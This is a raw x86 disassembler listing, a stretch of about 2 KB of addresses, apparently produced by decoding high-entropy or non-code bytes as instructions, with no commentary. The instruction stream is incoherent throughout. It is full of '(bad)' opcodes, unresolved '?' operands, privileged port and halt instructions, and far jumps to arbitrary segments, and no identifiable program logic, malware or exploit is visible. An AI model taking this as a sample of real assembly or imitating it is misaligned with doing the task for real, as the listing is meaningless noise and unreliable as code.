  4077a6:	ror    BYTE PTR [esi],1
  4077a8:	nop
  4077a9:	xor    BYTE PTR [esi],dh
  4077ab:	xchg   edx,eax
  4077ac:	int    0x13
  4077ae:	sbb    al,0xbb
  4077b0:	imul   eax,DWORD PTR [esi],0xffffff84
  4077b3:	adc    esi,DWORD PTR [ebx-0x7a43213f]
  4077b9:	sbb    eax,0x479076e2
  4077be:	neg    BYTE PTR [ebx+0x2a7ba01e]
  4077c4:	inc    edi
  4077c5:	gs (bad) 
  4077c7:	mov    esp,0xae05d877
  4077cc:	cmp    bh,0xe0
  4077cf:	ins    BYTE PTR es:[edi],dx
  4077d0:	mov    edx,DWORD PTR [edi-0x2715403f]
  4077d6:	sti    
  4077d7:	cwde   
  4077d8:	lock sbb al,0xd9
  4077db:	jecxz  0x4077c3
  4077dd:	mov    DWORD PTR [esi+0x33280078],edx
  4077e3:	pop    edx
  4077e4:	(bad)  [edx]
  4077e6:	fs xchg ebx,eax
  4077e8:	xchg   esp,eax
  4077e9:	add    dh,BYTE PTR [esi]
  4077eb:	(bad)  
  4077ec:	fdiv   QWORD PTR [edx]
  4077ee:	mov    es,WORD PTR ds:0x4197cc8d
  4077f4:	leave  
  4077f5:	xlat   BYTE PTR ds:[ebx]
  4077f6:	push   edi
  4077f7:	xchg   ebx,eax
  4077f8:	mov    esp,DWORD PTR [ebp+0x5d58a428]
  4077fe:	scas   al,BYTE PTR es:[edi]
  4077ff:	mov    eax,0x3e93ccd9
  407804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407805:	jmp    0xbbab:0x13c1620d
  40780c:	mov    ds:0x28861b67,al
  407811:	loopne 0x40779e
  407813:	xchg   esi,eax
  407814:	imul   esi,DWORD PTR [edi+0x63],0xffffffe7
  407818:	fild   DWORD PTR [esi+edi*2-0x5a]
  40781c:	mov    BYTE PTR [edi-0x208c2578],ah
  407822:	cmpps  xmm5,XMMWORD PTR [ebx],0x40
  407826:	xor    eax,0x8c6bb4c5
  40782b:	or     eax,0xf1b4af1
  407830:	mov    ecx,?
  407832:	popf   
  407833:	sub    eax,0x99bdefc3
  407838:	xor    BYTE PTR [ecx-0x66ed1b3f],al
  40783e:	inc    ebp
  40783f:	shl    edi,1
  407841:	(bad)  
  407842:	adc    eax,DWORD PTR fs:[esp+edi*4+0x34a02854]
  40784a:	ins    DWORD PTR es:[edi],dx
  40784b:	xchg   edx,eax
  40784c:	mov    ebp,0xa46e3374
  407851:	pop    edi
  407852:	aam    0x5a
  407854:	aad    0x68
  407856:	adc    al,0xd6
  407858:	sar    DWORD PTR ds:0x8a801600,cl
  40785e:	outs   dx,DWORD PTR ds:[esi]
  40785f:	js     0x40787e
  407861:	sub    al,0x55
  407863:	repnz call 0xd6d:0xae454105
  40786b:	ret    0x9114
  40786e:	cwde   
  40786f:	arpl   WORD PTR [edi],si
  407871:	iret   
  407872:	inc    edx
  407873:	pop    ss
  407874:	mov    bh,0xdb
  407876:	add    edi,DWORD PTR [edi+0x127b1852]
  40787c:	mov    bh,0x4f
  40787e:	mov    ecx,0x8cb5aa59
  407883:	xchg   esi,eax
  407884:	jae    0x4078c9
  407886:	shl    ch,1
  407888:	xor    BYTE PTR [ecx-0x67],bl
  40788b:	jae    0x4078c1
  40788d:	dec    eax
  40788e:	jnp    0x407878
  407890:	ja     0x407875
  407892:	(bad)  
  407894:	lea    ebp,[edi]
  407896:	jb     0x4078f2
  407898:	(bad)  
  407899:	retf   
  40789a:	xor    eax,0xc32cae9f
  40789f:	adc    ebx,DWORD PTR [eax*2-0x4306ecb3]
  4078a6:	jne    0x40782f
  4078a8:	repnz mov al,ds:0x7ed636d7
  4078ae:	repz jl 0x4078ea
  4078b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b3:	pmulhw mm4,QWORD PTR [esi]
  4078b6:	mov    eax,ds:0x954ee55a
  4078bb:	jge    0x407859
  4078bd:	(bad)  
  4078be:	je     0x40793c
  4078c0:	arpl   WORD PTR [ebx-0xbff8059],cx
  4078c6:	pop    edi
  4078c7:	ror    BYTE PTR [esi+0xf],cl
  4078ca:	mov    ecx,eax
  4078cc:	iret   
  4078cd:	jns    0x4078a0
  4078cf:	dec    esi
  4078d0:	xor    BYTE PTR [eax+0x1df5e6d5],bl
  4078d6:	sub    DWORD PTR [edi+esi*8-0x2085e1eb],edx
  4078dd:	hlt    
  4078de:	and    dl,BYTE PTR [ecx]
  4078e0:	sub    ecx,DWORD PTR [ecx+0x12]
  4078e3:	jne    0x40786e
  4078e5:	neg    DWORD PTR fs:[edx]
  4078e8:	ret    
  4078e9:	adc    DWORD PTR [eax-0x743d8b05],esp
  4078ef:	outs   dx,DWORD PTR ds:[esi]
  4078f0:	imul   BYTE PTR [ebp-0x1787f7f9]
  4078f6:	data16 jle 0x407911
  4078f9:	xor    eax,0xcbcacd76
  4078fe:	or     eax,0x8146b77e
  407903:	jnp    0x4078a7
  407905:	sbb    DWORD PTR [eax+0x625e6d89],ecx
  40790b:	fwait
  40790c:	sbb    edi,DWORD PTR [edx-0x44407be9]
  407912:	hlt    
  407913:	push   ss
  407914:	(bad)  
  407915:	mov    BYTE PTR [ebx-0x14],dh
  407918:	rcl    DWORD PTR [eax+0x7119d824],1
  40791e:	adc    al,BYTE PTR [esi-0x1714575]
  407924:	(bad)  
  407925:	lahf   
  407926:	sub    eax,0xaeeb78e1
  40792b:	int    0xb3
  40792d:	sub    dh,BYTE PTR [eax+0x41e49762]
  407933:	shl    DWORD PTR [ebp+esi*1+0x1c829239],0xd3
  40793b:	into   
  40793c:	mov    eax,0xb8efdd22
  407941:	xchg   ecx,eax
  407942:	(bad)
  407945:	arpl   WORD PTR [esi+0x165e586f],cx
  40794b:	pushf  
  40794c:	lea    esp,[esi+0x23]
  40794f:	sub    BYTE PTR [esi+ebx*2],bh
  407952:	sbb    BYTE PTR [ecx],dl
  407954:	mov    eax,0xddc69cc1
  407959:	leave  
  40795a:	xchg   eax,ecx
  40795c:	sub    BYTE PTR [ecx-0x6d],ch
  40795f:	sbb    eax,0xc7fb0232
  407964:	(bad)  [esp+eiz*8]
  407967:	adc    DWORD PTR [ecx+0x1e731dd7],esp
  40796d:	pop    es
  40796e:	sub    DWORD PTR [ebx],ebp
  407970:	sbb    DWORD PTR [ebp+0x28c33143],edx
  407976:	adc    eax,eax
  407978:	pop    ebx
  407979:	push   ss
  40797a:	test   BYTE PTR es:[ebx-0x4a7d797],dh
  407981:	push   edx
  407982:	popa   
  407983:	mov    DWORD PTR [ebx],esp
  407985:	rcr    BYTE PTR [eiz*2-0x6b8fd2eb],1
  40798c:	dec    esp
  40798d:	dec    esp
  40798e:	int3   
  40798f:	push   esi
  407990:	mov    dh,0xf8
  407992:	mov    ch,0x80
  407994:	cs or  cl,dl
  407997:	imul   ebx,DWORD PTR [ecx+ecx*1],0xffffffc4
  40799b:	mov    ds:0x9e6c94b3,al
  4079a0:	stos   BYTE PTR es:[edi],al
  4079a1:	nop
  4079a2:	dec    ebp
  4079a3:	inc    BYTE PTR [ecx+ecx*1]
  4079a6:	mov    ebp,0x11e91da3
  4079ab:	inc    ecx
  4079ac:	pop    edi
  4079ad:	push   ebx
  4079ae:	push   eax
  4079af:	push   0xffffffc7
  4079b1:	sub    eax,0x3ddcc619
  4079b6:	dec    esp
  4079b7:	in     al,0xbd
  4079b9:	add    eax,0x52a81cc0
  4079be:	cld    
  4079bf:	call   0x6489be6d
  4079c4:	popf   
  4079c5:	cmp    BYTE PTR [ebx+eiz*2+0x5b4ddee2],dh
  4079cc:	xchg   ebx,eax
  4079cd:	ins    BYTE PTR es:[edi],dx
  4079ce:	lods   al,BYTE PTR ds:[esi]
  4079cf:	pop    ebx
  4079d0:	xchg   esp,eax
  4079d1:	jne    0x4079bd
  4079d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079d4:	mov    al,ds:0xee5785ac
  4079d9:	xlat   BYTE PTR ds:[ebx]
  4079da:	outs   dx,BYTE PTR ds:[esi]
  4079db:	out    0x5,eax
  4079dd:	imul   esp,DWORD PTR [ecx],0xffda6884
  4079e3:	lds    esp,FWORD PTR gs:[ecx]
  4079e6:	jns    0x4079a2
  4079e8:	xlat   BYTE PTR ds:[ebx]
  4079e9:	mov    ?,WORD PTR [eax+0x19]
  4079ec:	fstp   DWORD PTR [esi+0x59]
  4079ef:	push   es
  4079f0:	out    dx,al
  4079f1:	arpl   WORD PTR [ebp-0x78542fe4],dx
  4079f7:	loopne 0x4079c3
  4079f9:	sar    DWORD PTR [ecx+eax*1-0x21],0x6e
  4079fe:	pop    edi
  4079ff:	jnp    0x407999
  407a01:	sub    al,0xbd
  407a03:	cmp    DWORD PTR [ebx],eax
  407a05:	add    al,BYTE PTR [esi+ebx*1]
  407a08:	in     al,0xb1
  407a0a:	ins    BYTE PTR es:[edi],dx
  407a0b:	bound  eax,QWORD PTR [ebp-0x80]
  407a0e:	add    al,0x97
  407a10:	mov    ebp,0x703402c4
  407a15:	mov    eax,ds:0x21d9871e
  407a1a:	dec    ebp
  407a1b:	or     al,0x83
  407a1d:	inc    edi
  407a1e:	dec    edx
  407a1f:	sbb    eax,0x1d016db5
  407a24:	nop
  407a25:	push   ecx
  407a26:	jnp    0x407a1b
  407a28:	fnstenv [edi-0x1f1a0be9]
  407a2e:	inc    ebx
  407a2f:	inc    ecx
  407a30:	sbb    al,0x98
  407a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a33:	fcomp  QWORD PTR [ebx+0x72a23b5]
  407a39:	xchg   esp,eax
  407a3a:	pop    ebp
  407a3b:	adc    al,0x3b
  407a3d:	add    BYTE PTR [eax-0x6f87c093],0x9
  407a44:	mov    BYTE PTR [ebx-0x59],0xfe
  407a48:	lods   eax,DWORD PTR ds:[esi]
  407a49:	mov    edi,DWORD PTR [eax+0x3c52bba7]
  407a4f:	or     DWORD PTR [ebx],edi
  407a51:	mov    eax,0xb4851dc9
  407a56:	dec    edi
  407a57:	cli    
  407a58:	adc    eax,0x1874938a
  407a5d:	rol    BYTE PTR [ecx*8+0x7d99612c],1
  407a64:	jno    0x407aa6
  407a66:	les    ebp,FWORD PTR [edi+0x8b1e084]
  407a6c:	into   
  407a6d:	mov    dl,0x96
  407a6f:	loope  0x407a7a
  407a71:	fstp   TBYTE PTR [eax+eax*2]
  407a74:	daa    
  407a75:	cmp    BYTE PTR [edi-0x5e5c6c7d],ch
  407a7b:	cli    
  407a7c:	sub    DWORD PTR [esi],ecx
  407a7e:	mov    ebp,0x476cacd8
  407a83:	xchg   edx,eax
  407a84:	and    edx,DWORD PTR [esi+eax*4+0x4d]
  407a88:	scas   al,BYTE PTR es:[edi]
  407a89:	ror    DWORD PTR [ebp-0xf],1
  407a8c:	adc    bl,ah
  407a8e:	pop    ebx
  407a8f:	sbb    dl,BYTE PTR [edx]
  407a91:	mov    ebx,0x278cec49
  407a96:	mov    al,ds:0x50bc744
  407a9b:	inc    edx
  407a9c:	(bad)  
  407a9d:	jns    0x407b0a
  407a9f:	stos   DWORD PTR es:[edi],eax
  407aa0:	iret   
  407aa1:	push   ebp
  407aa2:	xor    eax,0x9631fe94
  407aa8:	popa   
  407aa9:	(bad)  
  407aab:	inc    esi
  407aac:	jne    0x407abf
  407aae:	mov    ah,0x44
  407ab0:	sub    eax,0x827d030
  407ab5:	push   ds
  407ab6:	or     ebp,DWORD PTR [edx+0x7d]
  407ab9:	popf   
  407aba:	lods   eax,DWORD PTR ds:[esi]
  407abb:	adc    al,0xe2
  407abd:	mov    ds:0xbf6eb59c,al
  407ac2:	shl    DWORD PTR [eax+0x6e105641],cl
  407ac8:	fistp  QWORD PTR ss:[esi+0x41]
  407acc:	ficomp DWORD PTR ds:0x62ca082d
  407ad2:	arpl   WORD PTR [ebp+0x46693748],bp
  407ad8:	imul   esi,DWORD PTR [ebp-0x14],0x440f1487
  407adf:	fcomp  DWORD PTR [esi]
  407ae1:	inc    ebx
  407ae2:	adc    edi,DWORD PTR [esi]
  407ae4:	fisttp WORD PTR [esi+0x7eaf6ed]
  407aea:	(bad)  
  407aeb:	fwait
  407aec:	jp     0x407b5e
  407aee:	jecxz  0x407b4c
  407af0:	add    eax,ebx
  407af2:	mov    ds:0x302bb6d5,eax
  407af7:	pop    es
  407af8:	push   0xb686dc35
  407afd:	out    0x46,eax
  407aff:	or     ebx,DWORD PTR [edx-0x19]
  407b02:	(bad)  
  407b03:	xchg   esp,eax
  407b04:	mov    ch,0x73
  407b06:	aam    0xa1
  407b08:	jns    0x407b5f
  407b0a:	adc    eax,0xe9466b72
  407b0f:	or     eax,DWORD PTR [ecx-0x55]
  407b12:	add    edi,esi
  407b14:	push   0xffffff94
  407b16:	lock sar BYTE PTR [ebx+0x43bbe002],cl
  407b1d:	mov    al,0xf8
  407b1f:	mov    ds:0xf5d3d80d,al
  407b24:	sbb    al,0x6d
  407b27:	loopne 0x407b2d
  407b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b2a:	loopne 0x407ad8
  407b2c:	retf   
  407b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b2e:	(bad)  
  407b2f:	sti    
  407b30:	pop    ebx
  407b31:	mov    eax,0x320eff61
  407b36:	pop    esp
  407b37:	stos   DWORD PTR es:[edi],eax
  407b38:	lahf   
  407b39:	xor    dh,bl
  407b3b:	in     al,dx
  407b3c:	xchg   esp,eax
  407b3d:	jnp    0x407ad9
  407b3f:	rcr    edi,1
  407b41:	push   ebp
  407b42:	les    ebx,FWORD PTR [ebp-0x71efc10f]
  407b48:	inc    edi
  407b49:	scas   eax,DWORD PTR es:[edi]
  407b4a:	push   eax
  407b4b:	and    ecx,DWORD PTR [ebp+0x4c5b56f1]
  407b51:	mov    ebp,0x9c35cbeb
  407b56:	in     al,dx
  407b57:	mov    ebx,0xed8d97e6
  407b5c:	pop    sp
  407b5e:	ret    
  407b5f:	adc    DWORD PTR [bx+di],esi
  407b62:	loopne 0x407b4f
  407b64:	xchg   esp,eax
  407b65:	aam    0xde
  407b67:	adc    ch,BYTE PTR [edi-0x6f]
  407b6a:	mov    esp,DWORD PTR [eax]
  407b6c:	mov    BYTE PTR [esi-0x5b7cf2f1],dh
  407b72:	mov    dl,0x74
  407b75:	cwde   
  407b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b77:	out    0x43,eax
  407b79:	push   ds
  407b7a:	jmp    FWORD PTR [edi-0x16]
  407b7d:	lds    edx,FWORD PTR [eax+0x6d]
  407b80:	adc    DWORD PTR [edi+0xb2dae31],esp
  407b86:	imul   ebp,DWORD PTR [edi+0x5557956e],0x2251ce30
  407b90:	retf   
  407b91:	or     BYTE PTR [edi],dl
  407b93:	inc    ebx
  407b94:	rdseed edx
  407b97:	jno    0x407baf
  407b99:	out    0x8b,eax
  407b9b:	xlat   BYTE PTR ds:[ebx]
  407b9c:	push   edx
  407b9d:	ret    0x1a00
  407ba0:	dec    esi
  407ba1:	imul   ebx,ebx,0xffffffb3
  407ba4:	or     eax,0xadd4fad4
  407ba9:	or     BYTE PTR [ebp-0x3a],ah
  407bac:	mov    ds:0xb1b9d966,al
  407bb1:	mov    edi,0xe2c6bc8d
  407bb6:	cs and ecx,esp
  407bb9:	inc    ecx
  407bba:	imul   ecx,DWORD PTR [edi],0x584e1d
  407bc0:	or     DWORD PTR [ebp-0x6d],eax
  407bc3:	sbb    DWORD PTR [ecx+eax*2+0x30ccada3],esp
  407bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bcb:	jb     0x407c46
  407bcd:	neg    DWORD PTR [esi-0x47]
  407bd0:	xor    dh,BYTE PTR [edi+0x66]
  407bd3:	pop    ebp
  407bd4:	mov    bl,0x32
  407bd6:	sub    dh,dl
  407bd8:	and    al,0xd3
  407bda:	xchg   ecx,eax
  407bdb:	mov    al,ds:0xe54e0a63
  407be0:	and    DWORD PTR [ebx+0x397b0654],edi
  407be6:	aas    
  407be7:	cmp    ebx,DWORD PTR [eax+eiz*2-0x73f7f39c]
  407bee:	dec    edx
  407bef:	in     al,dx
  407bf0:	xlat   BYTE PTR ds:[ebx]
  407bf1:	dec    edi
  407bf2:	stos   DWORD PTR es:[edi],eax
  407bf3:	and    bh,ah
  407bf5:	add    DWORD PTR [esi+0x277897b6],esi
  407bfb:	gs mov esp,ss
  407bfe:	push   cs
  407bff:	lods   eax,DWORD PTR ds:[esi]
  407c00:	push   ebx
  407c01:	xor    BYTE PTR [ebp+0x51],dh
  407c04:	lea    esp,[ebp-0x2e]
  407c07:	mul    BYTE PTR [ecx+0x29d443c4]
  407c0d:	xchg   ebp,eax
  407c0e:	cld    
  407c0f:	out    0x88,al
  407c11:	xchg   dl,bh
  407c13:	cmc    
  407c14:	lock sub ch,BYTE PTR [ebx-0x70]
  407c18:	std    
  407c19:	stos   BYTE PTR es:[edi],al
  407c1a:	mov    edx,0xaf37f7cf
  407c1f:	mov    ah,0xc8
  407c21:	jae    0x407bd2
  407c23:	sub    eax,0xe7a30185
  407c28:	jp     0x407c61
  407c2a:	jb     0x407c29
  407c2c:	sti    
  407c2d:	xor    eax,0xe79f6c86
  407c32:	bound  edx,QWORD PTR [esi+0x6f]
  407c35:	leave  
  407c36:	adc    ax,0x60e2
  407c3a:	es ret 0x3270
  407c3e:	inc    eax
  407c3f:	dec    ecx
  407c40:	or     DWORD PTR [edi+0x6ef051e3],0xac0f0f63
  407c4a:	adc    al,BYTE PTR [edx+0x2db544d7]
  407c50:	rcl    DWORD PTR [edx+0x35],cl
  407c53:	cld    
  407c54:	jmp    0x6d2:0x651d1b3
  407c5b:	not    ch
  407c5d:	jb     0x407c0d
  407c5f:	inc    ebx
  407c60:	pop    ebx
  407c61:	adc    eax,0xf5b14819
  407c66:	les    esp,FWORD PTR [esi-0x28]
  407c69:	mov    al,0x59
  407c6b:	inc    edx
  407c6c:	sbb    esi,edx
  407c6e:	mov    ecx,edx
  407c70:	push   ebp
  407c71:	leave  
  407c72:	sbb    al,0x11
  407c74:	xchg   esi,eax
  407c75:	cwde   
  407c76:	sar    edi,0x6
  407c79:	out    0xdf,eax
  407c7b:	shr    DWORD PTR [ecx-0x15],0x7c
  407c7f:	std    
  407c80:	or     al,dh
  407c82:	call   0xcf84a908
  407c87:	gs nop
  407c89:	sti    
  407c8a:	into   
  407c8b:	into   
  407c8c:	stos   BYTE PTR es:[edi],al
  407c8d:	call   0x1473:0xa5289eec
  407c94:	sbb    eax,0x9b286959
  407c99:	dec    edi
  407c9a:	mov    esp,0x20d59e7f
  407c9f:	ja     0x407c51
  407ca1:	push   ecx
  407ca2:	shl    edi,0x43
  407ca5:	popf   
  407ca6:	xor    al,0xd3
  407ca8:	dec    edi
  407ca9:	mov    ds:0xe3537eb4,eax
  407cae:	fwait
  407caf:	sub    al,0x99
  407cb1:	inc    esi
  407cb2:	je     0x407cfb
  407cb4:	xchg   esp,eax
  407cb5:	out    dx,eax
  407cb6:	sub    eax,0x24a5ef3a
  407cbb:	add    BYTE PTR [ebp-0x60],ch
  407cbe:	and    DWORD PTR [edx],eax
  407cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cc1:	call   0x660d:0x6076677f
  407cc8:	push   esp
  407cc9:	sub    esi,edx
  407ccb:	fsub   QWORD PTR [ecx+0x21]
  407cce:	mov    ecx,0x3a2cf728
  407cd3:	pop    edi
  407cd4:	sbb    ecx,DWORD PTR [esi+0x62]
  407cd7:	sub    DWORD PTR [esi-0x23],ebp
  407cda:	sub    DWORD PTR cs:[esi-0x5b191c93],0xffffff9f
  407ce2:	dec    esp
  407ce3:	retf   0x6545
  407ce6:	cwde   
  407ce7:	mov    ah,0x81
  407ce9:	add    eax,DWORD PTR [ebp-0x18]
  407cec:	dec    edx
  407ced:	ds dec ebp
  407cef:	sahf   
  407cf0:	fistp  DWORD PTR [eax-0x4c]
  407cf3:	icebp  
  407cf4:	sbb    dh,BYTE PTR [edx-0x66cca9d8]
  407cfa:	jbe    0x407d6c
  407cfc:	push   eax
  407cfd:	add    BYTE PTR [ebx+0x52b173df],0x90
  407d04:	adc    DWORD PTR [eax],0x19
  407d07:	mov    ecx,0xcf86700e
  407d0c:	test   BYTE PTR [edi-0x4c],ah
  407d0f:	(bad)  
  407d10:	loop   0x407cd5
  407d12:	push   cs
  407d13:	mov    dl,ch
  407d15:	adc    BYTE PTR [eax-0x2d],cl
  407d18:	(bad)  
  407d19:	arpl   WORD PTR [edx],cx
  407d1b:	mov    ah,0x40
  407d1d:	xor    DWORD PTR [eax],edi
  407d1f:	sbb    al,0x13
  407d21:	popf   
  407d22:	ins    BYTE PTR es:[edi],dx
  407d23:	jge    0x407d8f
  407d25:	lahf   
  407d26:	mov    esi,0x3b2b3a3d
  407d2b:	test   BYTE PTR [edx+0x1873b125],bh
  407d31:	js     0x407d29
  407d33:	jmp    0x407ceb
  407d35:	mov    ecx,0x9db93081
  407d3a:	sbb    ecx,DWORD PTR [ecx-0x20dd822b]
  407d40:	xchg   ecx,eax
  407d41:	clc    
  407d42:	(bad)
  407d45:	jo     0x407d6d
  407d47:	es sti 
  407d49:	push   cs
  407d4a:	mov    ebx,0xd25f4b59
  407d4f:	ins    BYTE PTR es:[edi],dx
  407d50:	(bad)  
  407d51:	cwde   
  407d52:	jbe    0x407dbd
  407d54:	je     0x407d81
  407d56:	xor    BYTE PTR [esi+0x28],cl
  407d59:	iret   
  407d5a:	sbb    ah,BYTE PTR ds:[edi+ebp*8-0x24]
  407d5f:	mov    cs,WORD PTR [edx+eiz*1+0x50be541f]
  407d66:	inc    ebx
  407d67:	sbb    eax,0x5085deaf
  407d6c:	out    dx,eax
  407d6d:	fst    QWORD PTR [edi+0x6]
  407d70:	mov    ds:0x8fe0fbfc,eax
  407d75:	mov    eax,0x18014036
  407d7a:	dec    ebp
  407d7b:	jle    0x407d34
  407d7d:	test   BYTE PTR [edi+0xd],0x38
  407d81:	push   edx
  407d82:	fnstcw WORD PTR ds:0x6b35cc33
  407d88:	xlat   BYTE PTR ds:[ebx]
  407d89:	mov    edx,0x4e47ec1e
  407d8e:	fild   QWORD PTR [ebx+0x62]
  407d91:	loop   0x407e09
  407d93:	(bad)  
  407d94:	mov    edi,0x67ed9c7b
  407d99:	arpl   WORD PTR [edi-0x1],si
  407d9c:	xor    ch,BYTE PTR [esi]
  407d9e:	fs mov ch,0xbf
  407da1:	stos   BYTE PTR es:[edi],al
  407da2:	mov    ebp,0xd9e7943a
  407da7:	xchg   edi,eax
  407da8:	sbb    dl,BYTE PTR [ebx-0x58]
  407dab:	pop    ecx
  407dac:	hlt    
  407dad:	adc    BYTE PTR [ebx+0x50],al
  407db0:	cwde   
  407db1:	loop   0x407dbc
  407db3:	mov    al,ds:0x958c9421
  407db8:	fistp  WORD PTR [ebx]
  407dba:	fwait
  407dbb:	shrd   edx,esp,cl
  407dbe:	pusha  
  407dbf:	lds    bp,DWORD PTR [ebx+0x7d08ea0e]
  407dc6:	pop    ebx
  407dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc8:	and    al,0xb0
  407dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dcb:	lahf   
  407dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dcd:	adc    al,0x3
  407dcf:	dec    edi
  407dd0:	inc    ebp
  407dd1:	test   BYTE PTR [ebp-0x17],ah
  407dd4:	sbb    al,0xe2
  407dd6:	mov    ecx,0xea2c6a4c
  407ddb:	jecxz  0x407e49
  407ddd:	das    
  407dde:	sub    cl,cl
  407de0:	mov    bh,BYTE PTR [edi+0x2eff573]
  407de6:	hlt    
  407de7:	out    0xc5,al
  407de9:	mov    eax,ds:0x8c343c41
  407dee:	add    dl,BYTE PTR [ebx-0x3c]
  407df1:	jno    0x407e6f
  407df3:	cmp    BYTE PTR [eax+edx*8-0x19],0xb
  407df8:	dec    edx
  407df9:	jno    0x407d8e
  407dfb:	push   es
  407dfc:	es (bad) 
  407dfe:	out    dx,eax
  407dff:	mov    WORD PTR ds:0x89268684,?
  407e05:	mov    WORD PTR [ebp+0x2c],cs
  407e08:	xchg   BYTE PTR [ecx],al
  407e0a:	bnd jbe 0x407e58
  407e0d:	mov    al,ds:0x4a6fb893
  407e12:	mov    al,0xf8
  407e14:	push   cs
  407e15:	mov    dl,0x7a
  407e17:	jg     0x407dd9
  407e19:	mov    edx,0x7dad8f62
  407e1e:	stos   BYTE PTR es:[edi],al
  407e1f:	ret    
  407e20:	in     al,0x26
  407e22:	xchg   DWORD PTR [ecx+0x97902fb],esi
  407e28:	jae    0x407e9d
  407e2a:	or     ch,BYTE PTR [esp+0x5b9ff8fb]
  407e31:	lods   eax,DWORD PTR ds:[esi]
  407e32:	jnp    0x407e03
  407e34:	push   edx
  407e35:	pop    ecx
  407e36:	outs   dx,DWORD PTR ds:[esi]
  407e37:	sbb    al,0xea
  407e39:	outs   dx,DWORD PTR ds:[esi]
  407e3a:	rol    DWORD PTR [esi-0xde83006],cl
  407e40:	add    al,0xd3
  407e42:	push   esi
  407e43:	adc    esp,esi
  407e45:	fld    QWORD PTR [esi+0x4604a9b]
  407e4b:	mov    WORD PTR [ebx-0x35],fs
  407e4e:	xchg   ecx,eax
  407e4f:	add    DWORD PTR [ecx],edx
  407e51:	mov    DWORD PTR [esi],ecx
  407e53:	fidivr DWORD PTR [ebp-0x7ebaa80c]
  407e59:	jae    0x407df8
  407e5b:	push   eax
  407e5c:	pushf  
  407e5d:	or     eax,0x8958a92f
  407e62:	cmp    eax,0x8d2cff25
  407e67:	dec    esp
  407e68:	out    dx,al
  407e69:	fmul   QWORD PTR [esp+eiz*8]
  407e6c:	cld    
  407e6d:	pop    ebp
  407e6e:	dec    edx
  407e6f:	jg     0x407e14
  407e71:	mov    edx,edi
  407e73:	jp     0x407eed
  407e75:	pop    edi
  407e76:	(bad)  
  407e77:	and    DWORD PTR [edx+0x22],edi
  407e7a:	jge    0x407ef7
  407e7c:	inc    eax
  407e7d:	inc    esp
  407e7e:	push   eax
  407e7f:	push   ds
  407e80:	and    DWORD PTR [edx-0x3b],edi
  407e83:	push   cs
  407e84:	mov    DWORD PTR [ecx+0x5ca1b540],ebp
  407e8a:	aam    0xf5
  407e8c:	and    ax,0x6d8
  407e90:	or     al,0x8f
  407e92:	stc    
  407e93:	ret    
  407e94:	inc    BYTE PTR [edx+0x4c184ee7]
  407e9a:	mov    eax,ds:0xf8d0a144
  407e9f:	call   0xeb6e:0xb9f27efa
  407ea6:	ss clc 
  407ea8:	inc    ecx
  407ea9:	das    
  407eaa:	cmp    dh,BYTE PTR [edx+esi*2+0x545abc22]
  407eb1:	(bad)  
  407eb2:	int    0xaf
  407eb4:	jb     0x407e3f
  407eb6:	loope  0x407eb0
  407eb8:	fldenv [esi]
  407eba:	aas    
  407ebb:	sub    al,0xd3
  407ebd:	hlt    
  407ebe:	inc    ecx
  407ebf:	repz xor eax,0x439c3eb7
  407ec5:	mov    ds:0x1f85f30,eax
  407eca:	mov    al,0x66
  407ecc:	sbb    ecx,DWORD PTR [eax-0x2c]
  407ecf:	lahf   
  407ed0:	push   edi
  407ed1:	lock aas 
  407ed3:	sub    eax,0xd90430a2
  407ed8:	ins    DWORD PTR es:[edi],dx
  407ed9:	retf   
  407eda:	xchg   esp,eax
  407edb:	stos   BYTE PTR es:[edi],al
  407edc:	mov    dh,0x38
  407ede:	xchg   edx,eax
  407edf:	xor    esp,edx
  407ee1:	hlt    
  407ee2:	in     al,0x50
  407ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ee5:	arpl   bp,ax
  407ee7:	cmp    al,0xd4
  407ee9:	add    eax,0x35fbf8a2
  407eee:	aad    0x26
  407ef0:	fsubr  st(2),st
  407ef2:	mov    al,0xe4
  407ef4:	xchg   ecx,eax
  407ef5:	push   esi
  407ef6:	std    
  407ef7:	xchg   BYTE PTR [ebp-0x27],cl
  407efa:	xor    ah,BYTE PTR [edx-0x23]
  407efd:	clc    
  407efe:	mov    cs,WORD PTR [ebx-0x69]
  407f01:	push   esi
  407f02:	mov    edi,0xdd1574ec
  407f07:	inc    edi
  407f08:	rcl    DWORD PTR [esi-0x214ea256],cl
  407f0e:	dec    edi
  407f0f:	or     BYTE PTR ds:0x70f9c3ae,ch
  407f15:	pop    es
  407f16:	mov    ecx,0x658a9e92
  407f1b:	or     al,0xf1
  407f1d:	aas    
  407f1e:	and    eax,0x88424a98
  407f23:	fcmovbe st,st(4)
  407f25:	push   es
  407f26:	mov    ecx,0x40e4576d
  407f2b:	out    0xb8,al
  407f2d:	popa   
  407f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f2f:	pop    eax
  407f30:	push   eax
  407f31:	mov    esi,0x1909effc
  407f36:	fsub   DWORD PTR [esp+ebp*1-0x16]
  407f3a:	in     al,dx
  407f3b:	push   edi
  407f3c:	xchg   edx,eax
  407f3d:	sub    ecx,edx
  407f3f:	jae    0x407ed2
  407f41:	mov    WORD PTR [eax+0x143a07fc],ds
  407f47:	sbb    DWORD PTR ss:[eax-0x7e79183f],edi
  407f4e:	inc    eax
  407f4f:	nop
  407f50:	sbb    DWORD PTR [ebx-0x48],0xacd4e945
  407f57:	test   DWORD PTR [edi+0x28],edx
  407f5a:	fdiv   QWORD PTR [ebp+0x5984ced9]
  407f60:	or     edx,ebx
  407f62:	cwde   
  407f63:	jl     0x407ee9
  407f65:	and    DWORD PTR [esi],ebp
  407f67:	xor    bl,ah
  407f69:	add    DWORD PTR [edx-0x40],edi
  407f6c:	cmp    al,0x1c
  407f6e:	adc    al,0x2f
  407f70:	stos   BYTE PTR es:[edi],al
  407f71:	(bad)  
